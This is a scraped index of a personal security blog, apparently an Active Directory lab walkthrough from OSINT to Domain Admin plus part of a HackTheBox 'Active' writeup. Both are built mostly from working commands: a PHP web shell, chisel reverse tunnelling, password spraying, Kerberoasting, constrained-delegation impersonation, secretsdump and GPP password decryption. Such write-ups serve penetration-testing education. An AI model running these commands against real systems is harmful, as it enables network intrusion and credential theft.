23 :52 .. drwxr-xr-x 2 www-data www-data 4096 Dec 17 23 :52 Admin -rw-r--r-- 1 www-data www-data 127 Dec 18 09 :59 config.php drwxr-xr-x 2 www-data www-data 4096 Dec 17 23 :52 css drwxr-xr-x 2 www-data www-data 4096 Dec 17 23 :52 fonts drwxr-xr-x 4 www-data www-data 4096 Dec 17 23 :52 images -rw-r--r-- 1 www-data www-data 55106 Dec 18 09 :52 index.html -rw-r--r-- 1 www-data www-data 612 Dec 18 09 :04 index.nginx-debian.html drwxr-xr-x 2 www-data www-data 4096 Dec 17 23 :52 js drwxr-xr-x 2 www-data www-data 4096 Dec 17 23 :52 php -rw-r--r-- 1 www-data www-data 550 Dec 18 09 :53 upload.php drwxr-xr-x 2 www-data www-data 4096 Dec 23 21 :15 uploads config.php looks interesting. By viewing it is content, we will discover user dev01 credentials. www-data@web01:~/html$ cat config.php <?php $config = array ( 'DB_HOST' = > 'localhost' , 'DB_USERNAME' = > 'dev01' , 'DB_PASSWORD' = > '1337D3v' , 'DB_DATABASE' = > 'xtechDB' ) ; ?> Let's verify the discovered credentials if they are valid. We can do this by switching to the user dev01 using su command. www-data@web01:~/html$ su dev01 Password: dev01@web01:/var/www/html$ id uid = 1001 ( dev01 ) gid = 1001 ( dev01 ) groups = 1001 ( dev01 ) Privilege Escalation \u00b6 In active directory PT, it is not necessary to gain root privileges in the Linux machines we can utilize that compromised Linux box to pivot into other machines in the same network. For learning purpose, we can try to escalate our privileges into root. First, checking the sudo rights of the current user. dev01@web01:/var/www/html$ sudo -l [ sudo ] password for dev01: Matching Defaults entries for dev01 on localhost: env_reset, mail_badpass, secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin \\: /snap/bin User dev01 may run the following commands on localhost: ( ALL : ALL ) ALL From the command output, we can identify that the user can run any commands with root privileges. We can abuse this by simply running the command su to switch to root. dev01@web01:/var/www/html$ sudo su root@web01:/var/www/html# id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) Now we are root. Checking root directory will reveal for us a log file that contain a password. root@web01:~# ls auth.log snap root@web01:~# cat auth.log Nov 17 15 :08:39 localhost sshd [ 621893 ] : Access from mail01 Nov 17 15 :08:39 localhost sshd [ 621893 ] : Enter password: Nov 17 15 :08:39 localhost sshd [ 621893 ] : P@ssw0rd! Nov 17 15 :09:12 localhost sshd [ 621893 ] : Login successfull Info It is hard to find similar scenario in real life, I made it basic in order to focus in Active Directory part and cover all the steps in Pentesting. Mail01 \u00b6 Pivot to Mail01 \u00b6 The previously discover log file disclose the host Mail01 in order to find it is IP address simply ping the host. root@web01:~# ping -c 3 mail01 PING mail01.xtech.local ( 10 .10.10.10 ) 56 ( 84 ) bytes of data. 64 bytes from mail01.xtech.local ( 10 .10.10.10 ) : icmp_seq = 1 ttl = 128 time = 0 .446 ms 64 bytes from mail01.xtech.local ( 10 .10.10.10 ) : icmp_seq = 2 ttl = 128 time = 0 .345 ms 64 bytes from mail01.xtech.local ( 10 .10.10.10 ) : icmp_seq = 3 ttl = 128 time = 0 .314 ms --- mail01.xtech.local ping statistics --- 3 packets transmitted, 3 received, 0 % packet loss, time 2023ms We identified the IP address of Mail01 host which is 10.10.10.10 . As we don't have access into the internal network ( 10.0.0.0 ) we will use chisel to pivot into the internal network. To utilize chisel we execute the following commands: Download chisel from this repo Transfer chisel to the target machine, to do this run: # In local, machine open Python HTTP server python3 -m http.server 9002 # In the target machine, download chisel wget http://ip:9001/chisel # Also don't forget to make chisel binary executable chmod +x chisel Start chisel server in your local machine: sudo chisel server -p 9003 --reverse Run the client from the target machine. Use the flag R:socks to make use of Socks proxy: ./chisel client ip:9003 R:socks Password Spray \u00b6 Lets's check if we can access Mail01 host from the web browser. Before we do that, setup socks5 proxy to do this install foxyproxy Firefox plugin. Then, add the following configuration: Now browse Mail01 website. It seems host running Outlook Web App (OWA). If we go back to OSINT stage, we discovered three email addresses. Furthermore, we discover a log file in Web01 that containing a conversation of two users one of them shared their password. With this known, we can now attempt to use that password to conduct a password spray against the collected email addresses. Here we will use SprayingToolKit it can be downloaded from the following repository . Now let's conduct password spray attack, before that we have to configure proxychains . Make sure proxychains configuration file pointed to Socks5 proxy ( 127.0.0.1:1080 ). The configuration file should be ending with the following line socks5 127.0.0.1 1080 tac /etc/proxychains.conf | head -n 1 socks5 127 .0.0.1 1080 Now run atomizer with the following flags: proxychains -q python3 atomizer.py owa 'https://10.10.10.10/autodiscover/autodiscover.xml' 'P@ssw0rd!' emails.txt We found one valid credentials lonnie.hill with password P@ssw0rd! . Let's use it to login into his mailbox. Enumerate Lonnie's Mailbox \u00b6 First thing that we will notice an email sent by the user Bob.Baker , this email contain the following: As seen in above screenshot, we obtained domain user Bob.baker password which is P@ssw0rd@21 . Enumerate the Domain Controller \u00b6 With two valid users on the domain, we can now run BloodHound to get dump of domain controller objects and permissions. I prefer to run BloodHound from Windows host, however, bloodhound can be run from Kali Linux using Python collector but it will not give us all attack paths. Windows: runas /netonly /user:xtech.local \\b ob.baker cmd P@ssw0rd@21 . \\b loodhound.exe --collectionmethod all Linux: bloodhound-python -c ALL -u bob.baker -p 'P@ssw0rd@21' -d xtech.local -dc 10 .10.10.10 After collecting Domain Controller objects run BloodHound. Search for the user Bob.Baker and inspect his attributes. If we inspected his outbound control rights, we will notice that the user bob.baker have Generic Write privileges on the service account ExchSVC Pivot to ExchSVC \u00b6 Abusing Generic Write Privileges \u00b6 BloodHound contains handy feature, which is we can see the methodology of abusing every ACL/privileges. We can view this if we hover over the link between object and clicked Help. Now how we can abuse Generic Write privileges? simply we can add Service Principle Name (SPN) attribute to the account ExchSVC . Service Principal Name (SPN) The SPN is unique identifier for the network Controller service instance, which is used by Kerberos authentication to associate a service instance with a service login account. Adding SPN attributes can be utilize using krbrelayx 's add-spn.py tool. The following commands will be used: First add SPN attribute to the service account ExchSVC: proxychains python3 addspn.py 10 .10.10.12 -u xtech.local \\\\ bob.baker -p 'P@ssw0rd@21' -t exchsvc -s cifs/mail01.xtech.local Then request SPN account TGT: proxychains impacket-GetUserSPNs xtech.local/bob.baker: 'P@ssw0rd@21' -dc-ip 10 .10.10.12 -request The following TGT will be retrieved: The retrieved TGT can be crack using hashcat , let's attempt to crack it using fasttrack.txt wordlist hashcat -a 0 -m 13100 spn.txt /usr/share/wordlists/fasttrack.txt --force We obtained password for the service account ExchSVC . We discovered also he is a local admin in the host web01 While we are having local admin privileges lets try to dump saved passwords from the LSA memory. No we have SQLSVC NTLM hash! now we can authenticate into any host using pass the hash technique . DC01 \u00b6 Abuse Constrained Delegation \u00b6 Constrained Delegation Constrained delegation allows an object (user/machine) to autheneticate as any user to specfic services. Means object with constrained delegation privileges can impersonate any domain user (including Domain Admins) to specific service in the target host. Going back into BloodHound, if we enumerate SQLSVC account, we will notice that the service account SQLSVC have constrained delegation privileges on the host DC01 . By abusing constrained delegation privileges we can impersonate the Domain Admin to authenticate on the DC01 , but first we have to know which service SQLSVC is allowed to delegate. This can be done either from Powerview 's Get-NetUser or from BloodHound. So the account SQLSVC are allowed to delegate to the service WWW/DC01 , we will use this service to impersonate the Domain Admin. Impacket contains a great tool called getST that can request a ticket. proxychains impacket-getST -impersonate administrator -spn WWW/dc01.xtech.local xtech.local/SQLSVC -hashes :5e76ca700abd3597ab702c0b52bacad2 -dc-ip 10 .10.10.12 Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation [ * ] Getting TGT for user [ * ] Impersonating Administrator [ * ] Requesting S4U2self [ * ] Requesting S4U2Proxy [ * ] Saving ticket in Administrator.ccache Then, we will store the TGT into the variable KRB5CCNAME . export KRB5CCNAME = administrator.ccache Finally, let's dump the Domain Admin NTLM hash using Secretdump proxychains -q impacket-secretsdump -k -no-pass dc01.xtech.local -just-dc-user administrator Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [ * ] Dumping Domain Credentials ( domain \\u id:rid:lmhash:nthash ) [ * ] Using the DRSUAPI method to get NTDS.DIT secrets xtech.local \\A dministrator:500:aad3b435b51404eeaad3b435b51404ee:f7b8c850b103fd71e2d60fbe19d1e373::: [ * ] Cleaning up... The attack works, we have impersonated the Domain Admin and dump it is NTLM hash now we have access into the xtech network. We can execute commands as Domain Admin. Or even login via RDP. Now we compromised the Xtech network domain controller and we full access in the infrastructure. References \u00b6 https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html https://book.hacktricks.xyz/windows/active-directory-methodology","title":"From OSINT Into Domain Admin"},{"location":"Posts/osint_into_da/#overview","text":"I\u2019ve had several customers come to me before a pentest and say they think they\u2019re in a good shape because their vulnerability scan shows no critical vulnerabilities and that they\u2019re ready for a pentest, which then leads me to getting domain administrator in fifteen minutes by just exploiting misconfigurations in AD. HAUSEC Active directory penetration testing it is very important in real life and PT job role, most of (at least all) the organizations have domain controller. This blog will demonstrate an attack scenario of advisory compromise the domain controller of a organization from OSINT. My main focus of this scenario is the active directory penetration testing by demonstrating in how an threat actor can pivot inside the organization network and compromise the Domain Controller. An overview of the stages of exploitation: OSINT Linux Privilege Escalation Pivoting Active Directory Enumeration Lateral Movement Kerberoasting Abusing Active Directory ACLs Constrained Delegation","title":"Overview"},{"location":"Posts/osint_into_da/#theoretical","text":"First of all, active directory is designed by Microsoft and used in most of organizations as the directory service that stores all information of the organization, such as computers, users, domains, printers and etc.","title":"Theoretical"},{"location":"Posts/osint_into_da/#attack-scenario","text":"","title":"Attack Scenario"},{"location":"Posts/osint_into_da/#entry-point","text":"XTech is an electronics-based technology company that which are well known in the country. XTech reached out a penetration testing company to conduct a penetration test for XTech infrastructure. The type of the penetration test was external black-box and the scope was xtech.com with the IP Address 192.168.241.204 .","title":"Entry Point"},{"location":"Posts/osint_into_da/#osint","text":"OSINT stands for Open-Source Intelligence which means the process of gathering public information about the target such as: employees names, company address, employees emails, technologies they are using and etc. Starting from OSINT, here we will attempt to collect as much information we can about the company passively. We will focus to gather email addresses. Let's browse the company website and try to collect information from it. By going into the \" Who we are \" section, we will find three different employees with their social media accounts. In real world scenario email addresses can be collected from different ways. There are many public OSINT tools that can be utilize to collect not only the email addresses also many other information about the target company. Example of tools that can be used: Google Dorks : using google search engine, try to search for any publicly available documents from targets websites. inside those document inspect the meta-data, usually you can find usernames there. zoominfo : useful for collecting employees email addresses. rocketreach . useful for collecting employees email addresses. For our scenario, I made the lab basic in order to make easy it to understand. So now we collected three email addresses: bob.baker@xtech.local lonnie.hill@xtech.local john.doe@xtech.local We will use them later to conduct different attack. Moving forward in inspecting the website, we will notice an upload button that asking to upload PDF document.","title":"OSINT"},{"location":"Posts/osint_into_da/#web01","text":"","title":"Web01"},{"location":"Posts/osint_into_da/#initial-access","text":"Let's try to abuse this function by uploading simple PHP file that grant us to execute commands. This can be done using the following one-liner command: echo '<?php echo system($_GET[\"cmd\"]);?>' > cmd.php By uploading the PHP file, the website will response with the following: The PHP file have been uploaded, however, we don't know where it is uploaded. We will need to brute force the directories to find the directory that the file have been uploaded into. We can use here wfuzz to brute force the directory that contains the PHP file cmd.php wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --hc 404 http://192.168.241.204/FUZZ/cmd.php The result of this command will be: Target: http://192.168.241.204/FUZZ/cmd.php Total requests: 4614 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000004216 : 500 0 L 0 W 0 Ch \"uploads\" So we found the directory uploads , now we can browse into that directory but we will use curl instead to make HTTP GET request. curl 'http://192.168.241.204/uploads/cmd.php?cmd=id' uid = 33 ( www-data ) gid = 33 ( www-data ) groups = 33 ( www-data ) We have now command execution in the server with the user www-data . To obtain reverse shell, we will upload shell.php which can found from the directory /usr/share/laudanum/php/ . After upload it, setup netcat listener and browse into the uploaded PHP file. Now we obtained reverse shell on Web01 host. Before enumerating the machine, first we will upgrade our shell to fully interactive shell using the following commands: $ which python3 /usr/bin/python3 $ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' www-data@web01:/$ export TERM = xterm www-data@web01:/$ ^Z # <-- CRTL + Z stty raw -echo ; fg # <-- in local machine www-data@web01:/$","title":"Initial Access"},{"location":"Posts/osint_into_da/#pivoting-to-dev01","text":"First, let's enumerate the users in this box: www-data@web01:~/html$ cat /etc/passwd | grep -i \"/bin/bash\" root:x:0:0:root:/root:/bin/bash dev01:x:1001:1001:devloper,devloper,,:/home/dev01:/bin/bash From the above command output, we identified that there are two users root and dev01 . Next, let's enumerate website files. www-data@web01:~/html$ ls -la total 104 drwxr-xr-x 8 www-data www-data 4096 Dec 18 09 :59 . drwxr-xr-x 4 dev01 dev01 4096 Dec 17 23 :52 .. drwxr-xr-x 2 www-data www-data 4096 Dec 17 23 :52 Admin -rw-r--r-- 1 www-data www-data 127 Dec 18 09 :59 config.php drwxr-xr-x 2 www-data www-data 4096 Dec 17 23 :52 css drwxr-xr-x 2 www-data www-data 4096 Dec 17 23 :52 fonts drwxr-xr-x 4 www-data www-data 4096 Dec 17 23 :52 images -rw-r--r-- 1 www-data www-data 55106 Dec 18 09 :52 index.html -rw-r--r-- 1 www-data www-data 612 Dec 18 09 :04 index.nginx-debian.html drwxr-xr-x 2 www-data www-data 4096 Dec 17 23 :52 js drwxr-xr-x 2 www-data www-data 4096 Dec 17 23 :52 php -rw-r--r-- 1 www-data www-data 550 Dec 18 09 :53 upload.php drwxr-xr-x 2 www-data www-data 4096 Dec 23 21 :15 uploads config.php looks interesting. By viewing it is content, we will discover user dev01 credentials. www-data@web01:~/html$ cat config.php <?php $config = array ( 'DB_HOST' = > 'localhost' , 'DB_USERNAME' = > 'dev01' , 'DB_PASSWORD' = > '1337D3v' , 'DB_DATABASE' = > 'xtechDB' ) ; ?> Let's verify the discovered credentials if they are valid. We can do this by switching to the user dev01 using su command. www-data@web01:~/html$ su dev01 Password: dev01@web01:/var/www/html$ id uid = 1001 ( dev01 ) gid = 1001 ( dev01 ) groups = 1001 ( dev01 )","title":"Pivoting to dev01"},{"location":"Posts/osint_into_da/#privilege-escalation","text":"In active directory PT, it is not necessary to gain root privileges in the Linux machines we can utilize that compromised Linux box to pivot into other machines in the same network. For learning purpose, we can try to escalate our privileges into root. First, checking the sudo rights of the current user. dev01@web01:/var/www/html$ sudo -l [ sudo ] password for dev01: Matching Defaults entries for dev01 on localhost: env_reset, mail_badpass, secure_path = /usr/local/sbin \\: /usr/local/bin \\: /usr/sbin \\: /usr/bin \\: /sbin \\: /bin \\: /snap/bin User dev01 may run the following commands on localhost: ( ALL : ALL ) ALL From the command output, we can identify that the user can run any commands with root privileges. We can abuse this by simply running the command su to switch to root. dev01@web01:/var/www/html$ sudo su root@web01:/var/www/html# id uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ) Now we are root. Checking root directory will reveal for us a log file that contain a password. root@web01:~# ls auth.log snap root@web01:~# cat auth.log Nov 17 15 :08:39 localhost sshd [ 621893 ] : Access from mail01 Nov 17 15 :08:39 localhost sshd [ 621893 ] : Enter password: Nov 17 15 :08:39 localhost sshd [ 621893 ] : P@ssw0rd! Nov 17 15 :09:12 localhost sshd [ 621893 ] : Login successfull Info It is hard to find similar scenario in real life, I made it basic in order to focus in Active Directory part and cover all the steps in Pentesting.","title":"Privilege Escalation"},{"location":"Posts/osint_into_da/#mail01","text":"","title":"Mail01"},{"location":"Posts/osint_into_da/#pivot-to-mail01","text":"The previously discover log file disclose the host Mail01 in order to find it is IP address simply ping the host. root@web01:~# ping -c 3 mail01 PING mail01.xtech.local ( 10 .10.10.10 ) 56 ( 84 ) bytes of data. 64 bytes from mail01.xtech.local ( 10 .10.10.10 ) : icmp_seq = 1 ttl = 128 time = 0 .446 ms 64 bytes from mail01.xtech.local ( 10 .10.10.10 ) : icmp_seq = 2 ttl = 128 time = 0 .345 ms 64 bytes from mail01.xtech.local ( 10 .10.10.10 ) : icmp_seq = 3 ttl = 128 time = 0 .314 ms --- mail01.xtech.local ping statistics --- 3 packets transmitted, 3 received, 0 % packet loss, time 2023ms We identified the IP address of Mail01 host which is 10.10.10.10 . As we don't have access into the internal network ( 10.0.0.0 ) we will use chisel to pivot into the internal network. To utilize chisel we execute the following commands: Download chisel from this repo Transfer chisel to the target machine, to do this run: # In local, machine open Python HTTP server python3 -m http.server 9002 # In the target machine, download chisel wget http://ip:9001/chisel # Also don't forget to make chisel binary executable chmod +x chisel Start chisel server in your local machine: sudo chisel server -p 9003 --reverse Run the client from the target machine. Use the flag R:socks to make use of Socks proxy: ./chisel client ip:9003 R:socks","title":"Pivot to Mail01"},{"location":"Posts/osint_into_da/#password-spray","text":"Lets's check if we can access Mail01 host from the web browser. Before we do that, setup socks5 proxy to do this install foxyproxy Firefox plugin. Then, add the following configuration: Now browse Mail01 website. It seems host running Outlook Web App (OWA). If we go back to OSINT stage, we discovered three email addresses. Furthermore, we discover a log file in Web01 that containing a conversation of two users one of them shared their password. With this known, we can now attempt to use that password to conduct a password spray against the collected email addresses. Here we will use SprayingToolKit it can be downloaded from the following repository . Now let's conduct password spray attack, before that we have to configure proxychains . Make sure proxychains configuration file pointed to Socks5 proxy ( 127.0.0.1:1080 ). The configuration file should be ending with the following line socks5 127.0.0.1 1080 tac /etc/proxychains.conf | head -n 1 socks5 127 .0.0.1 1080 Now run atomizer with the following flags: proxychains -q python3 atomizer.py owa 'https://10.10.10.10/autodiscover/autodiscover.xml' 'P@ssw0rd!' emails.txt We found one valid credentials lonnie.hill with password P@ssw0rd! . Let's use it to login into his mailbox.","title":"Password Spray"},{"location":"Posts/osint_into_da/#enumerate-lonnies-mailbox","text":"First thing that we will notice an email sent by the user Bob.Baker , this email contain the following: As seen in above screenshot, we obtained domain user Bob.baker password which is P@ssw0rd@21 .","title":"Enumerate Lonnie's Mailbox"},{"location":"Posts/osint_into_da/#enumerate-the-domain-controller","text":"With two valid users on the domain, we can now run BloodHound to get dump of domain controller objects and permissions. I prefer to run BloodHound from Windows host, however, bloodhound can be run from Kali Linux using Python collector but it will not give us all attack paths. Windows: runas /netonly /user:xtech.local \\b ob.baker cmd P@ssw0rd@21 . \\b loodhound.exe --collectionmethod all Linux: bloodhound-python -c ALL -u bob.baker -p 'P@ssw0rd@21' -d xtech.local -dc 10 .10.10.10 After collecting Domain Controller objects run BloodHound. Search for the user Bob.Baker and inspect his attributes. If we inspected his outbound control rights, we will notice that the user bob.baker have Generic Write privileges on the service account ExchSVC","title":"Enumerate the Domain Controller"},{"location":"Posts/osint_into_da/#pivot-to-exchsvc","text":"","title":"Pivot to ExchSVC"},{"location":"Posts/osint_into_da/#abusing-generic-write-privileges","text":"BloodHound contains handy feature, which is we can see the methodology of abusing every ACL/privileges. We can view this if we hover over the link between object and clicked Help. Now how we can abuse Generic Write privileges? simply we can add Service Principle Name (SPN) attribute to the account ExchSVC . Service Principal Name (SPN) The SPN is unique identifier for the network Controller service instance, which is used by Kerberos authentication to associate a service instance with a service login account. Adding SPN attributes can be utilize using krbrelayx 's add-spn.py tool. The following commands will be used: First add SPN attribute to the service account ExchSVC: proxychains python3 addspn.py 10 .10.10.12 -u xtech.local \\\\ bob.baker -p 'P@ssw0rd@21' -t exchsvc -s cifs/mail01.xtech.local Then request SPN account TGT: proxychains impacket-GetUserSPNs xtech.local/bob.baker: 'P@ssw0rd@21' -dc-ip 10 .10.10.12 -request The following TGT will be retrieved: The retrieved TGT can be crack using hashcat , let's attempt to crack it using fasttrack.txt wordlist hashcat -a 0 -m 13100 spn.txt /usr/share/wordlists/fasttrack.txt --force We obtained password for the service account ExchSVC . We discovered also he is a local admin in the host web01 While we are having local admin privileges lets try to dump saved passwords from the LSA memory. No we have SQLSVC NTLM hash! now we can authenticate into any host using pass the hash technique .","title":"Abusing Generic Write Privileges"},{"location":"Posts/osint_into_da/#dc01","text":"","title":"DC01"},{"location":"Posts/osint_into_da/#abuse-constrained-delegation","text":"Constrained Delegation Constrained delegation allows an object (user/machine) to autheneticate as any user to specfic services. Means object with constrained delegation privileges can impersonate any domain user (including Domain Admins) to specific service in the target host. Going back into BloodHound, if we enumerate SQLSVC account, we will notice that the service account SQLSVC have constrained delegation privileges on the host DC01 . By abusing constrained delegation privileges we can impersonate the Domain Admin to authenticate on the DC01 , but first we have to know which service SQLSVC is allowed to delegate. This can be done either from Powerview 's Get-NetUser or from BloodHound. So the account SQLSVC are allowed to delegate to the service WWW/DC01 , we will use this service to impersonate the Domain Admin. Impacket contains a great tool called getST that can request a ticket. proxychains impacket-getST -impersonate administrator -spn WWW/dc01.xtech.local xtech.local/SQLSVC -hashes :5e76ca700abd3597ab702c0b52bacad2 -dc-ip 10 .10.10.12 Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation [ * ] Getting TGT for user [ * ] Impersonating Administrator [ * ] Requesting S4U2self [ * ] Requesting S4U2Proxy [ * ] Saving ticket in Administrator.ccache Then, we will store the TGT into the variable KRB5CCNAME . export KRB5CCNAME = administrator.ccache Finally, let's dump the Domain Admin NTLM hash using Secretdump proxychains -q impacket-secretsdump -k -no-pass dc01.xtech.local -just-dc-user administrator Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [ * ] Dumping Domain Credentials ( domain \\u id:rid:lmhash:nthash ) [ * ] Using the DRSUAPI method to get NTDS.DIT secrets xtech.local \\A dministrator:500:aad3b435b51404eeaad3b435b51404ee:f7b8c850b103fd71e2d60fbe19d1e373::: [ * ] Cleaning up... The attack works, we have impersonated the Domain Admin and dump it is NTLM hash now we have access into the xtech network. We can execute commands as Domain Admin. Or even login via RDP. Now we compromised the Xtech network domain controller and we full access in the infrastructure.","title":"Abuse Constrained Delegation"},{"location":"Posts/osint_into_da/#references","text":"https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html https://book.hacktricks.xyz/windows/active-directory-methodology","title":"References"},{"location":"Writeups/","text":"Overview \u00b6 Here is collection of my writeups of boxes I have solved in HackTheBox. I'll share only the machines that I wrote a writeup for them all machines that I solved, solved many machines but i did have the time to write the writeup. Machines \u00b6 Active Bastian Intelligence Knife Love Monitors Scrambled Shoker","title":"Overview"},{"location":"Writeups/#overview","text":"Here is collection of my writeups of boxes I have solved in HackTheBox. I'll share only the machines that I wrote a writeup for them all machines that I solved, solved many machines but i did have the time to write the writeup.","title":"Overview"},{"location":"Writeups/#machines","text":"Active Bastian Intelligence Knife Love Monitors Scrambled Shoker","title":"Machines"},{"location":"Writeups/machines/active/writeup/","text":"Overview \u00b6 Walkthrough \u00b6 Recon \u00b6 nmap \u00b6 PORT STATE SERVICE REASON VERSION 53 /tcp open domain syn-ack Microsoft DNS 6 .1.7601 ( 1DB15D39 ) ( Windows Server 2008 R2 SP1 ) | dns-nsid: | _ bind.version: Microsoft DNS 6 .1.7601 ( 1DB15D39 ) 88 /tcp open kerberos-sec syn-ack Microsoft Windows Kerberos ( server time: 2021 -07-02 09 :48:09Z ) 135 /tcp open msrpc syn-ack Microsoft Windows RPC 139 /tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 389 /tcp open ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: active.htb, Site: Default-First-Site-Name ) 445 /tcp open microsoft-ds? syn-ack 464 /tcp open kpasswd5? syn-ack 593 /tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1 .0 636 /tcp open tcpwrapped syn-ack 3268 /tcp open ldap syn-ack Microsoft Windows Active Directory LDAP ( Domain: active.htb, Site: Default-First-Site-Name ) 3269 /tcp open tcpwrapped syn-ack 49152 /tcp open msrpc syn-ack Microsoft Windows RPC 49153 /tcp open msrpc syn-ack Microsoft Windows RPC 49154 /tcp open msrpc syn-ack Microsoft Windows RPC 49155 /tcp open msrpc syn-ack Microsoft Windows RPC 49157 /tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1 .0 49158 /tcp open msrpc syn-ack Microsoft Windows RPC By looking into nmap results, we can identify that the host is Domain Controller. Enumerating Open Shares \u00b6 \u039e ~/tmp \u2192 smbclient -L \\\\\\\\ 10 .10.10.100 -U '' -N Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk Found open folder Replication , lets dump it is content \u039e Active/dump \u2192 smbclient \\\\\\\\ 10 .10.10.100 \\\\ Replication -U '' -N Try \"help\" to get a list of possible commands. smb: \\> recurse on smb: \\> prompt off smb: \\> mget * GPP Stored Credentials \u00b6 The file contain AD Group Policy Preferences (GPP), lets search for any encrypted password. GPP Stored Credentials is old vulnerability which is currently patched, for further reading see the this link: https://adsecurity.org/?p=2288 Usually GPP encrypted passwords is stored in the variable cpassword we can use grep to search for cpassword variable: \u039e Active/dump \u2192 grep -iR \"cpassword\" active.htb/Policies/ { 31B2F340-016D-11D2-945F-00C04FB984F9 } /MACHINE/Preferences/Groups/Groups.xml:<Groups clsid = \"{3125E937-EB16-4b4c-9934-544FC6D24D26}\" ><User clsid = \"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name = \"active.htb\\SVC_TGS\" image = \"2\" changed = \"2018-07-18 20:46:06\" uid = \"{EF57DA28-5F69-4530-A59E-AAB58578219D}\" ><Properties action = \"U\" newName = \"\" fullName = \"\" description = \"\" cpassword = \"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon = \"0\" noChange = \"1\" neverExpires = \"1\" acctDisabled = \"0\" userName = \"active.htb\\SVC_TGS\" /></User> Found GPP encypted password for the user svc_tgs which is: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ Kali linux have built in tool that can decrypt GPP Encrypted password gpp-decrypt : \u039e OldBoxes/shocker \u2192 gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ GPPstillStandingStrong2k18 svc_tgs user password is GPPstillStandingStrong2k18 Request SPN Service Account Tickets \u00b6 After obtain svc_tgs credentials lets use it to request SPN Service accounts tickets: \u039e Active/dump \u2192 GetUserSPNs.py -dc-ip 10 .10.10.100 active.htb/svc_tgs -request Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ---------- active/CIFS:445 Administrator CN = Group Policy Creator Owners,CN = Users,DC = active,DC = htb 2018 -07-18 15 :06:40.351723 2021 -01-21 11 :07:03.723783 $krb5tgs$23$* Administrator $ACTIVE .HTB $active .htb/Administrator* $b43bf8023365ea1108b5424b53c2a450$146 e01d19a37eca33003ca119ded7a074639abadba134eeed77439ba7679c5dda70afc803385e024a64b2fac83e29d1d75d81f0573aa0cce61870aee4eab395ca3b48146e75ade21025ef408446ad90763ef6e17cea403f82eacf20178fc78a3b6cc8694136a816c8aeac46fd23cf95729a287ea6c8232c554a7ce1f2244df1df6c8a34fcfac5199147f26249343a1f34f224716098568e7eb7c490760f1bc90100536274d89bba11e134c6df6b8d625d3805f9a60dfc1e47b15b038ba8c43fbf4d27249f92ac80fc8828d1a29b601c4d9271774239400b95c7fd530991ff5b37b5c26b192b0cfbea2af928adf902ea373ac9997e6f3379345c5f324fd4e8ab76c1dc98c71cc2e78d2e360dfa1196d7319f5ed40d3011372c91a6f0411dd56af96bc4b3af8bb29c68462313b56d2b86aa0b60448ad8b2a7f878c74621388ea0dcb7a0fe165eca97dbd549e2b2e34654cca5d6ce1d6d2c697ae41bd24d599d0f6ad74fd1f063c66ec6a87029baa4731d0be51f63a54d7bcdc7ba13f2e834c381fb1d46e7c6df8675dc85b6ccb328494635a2c2ee48cbc9d2c8514b8884d945f796cb4c468fa631c2e33253da49cd16cd46fc170e66435d5395080af0ebffb39e6d514524258accb383e7d5f65d4536255ee19d381ee1fea36e746eea0333f8126c4b22c9ff9d79c77d03abff93318e9277f75d81fcd93ea1c039706f41585d2383e0af51b3f990cc2a32608a482d564455c405324e9b2f678300ff1056cfecd5d242bc39451f885f1441a4a80334ce19104accd3bed6476ea454d053c2d386078960a66df55c4706b945612fa712c4d4a70cb07c2f3d5a648e9620be5fb049e73bbe30bfeecf48f1f483bb5bed90337f4e56d033a1a3fce605d05043f1d24c1f73213a2591fa538f9215dee625df91a9157f09a074259b96a1993d045a59ae97103f8f2395866f3829fde0a7eb6ea3708982770649321534fd29ebbb8072e8a1ed7494e5967aa2526e572746c02e9ccb61d1738923c00fe9ab846c47712d8d5b0c9e8a0298c96321a0b5fd2f9ef31433043f8d219f80cffb98e86ce024a4e7ad3e61632a081a86d93b0554ec4d69d776ca9f8f8386d13c23a0a35138e998ce6029ae963b9964b14289de3e554e96be23b6ceb3469d8ef76e0d98a9faf7b32a4a0387aee9c48072245d926db2641379f7a79f26440465fff1340a5e4f5cec32166e780cb452e2e53e4975b5aac913e93175aa7c7a3b53477339d7c We found Administrator ticket! Let's crack it using hashcat Active/dump \u2192 hashcat -a 0 -m 13100 admin-krb.txt /usr/share/wordlists/rockyou.txt --force hashcat ( v6.1.1 ) starting... ... $krb5tgs$23$* Administrator$... ....9d7c:Ticketmaster1968 Session..........: hashcat Status...........: Cracked .... Now 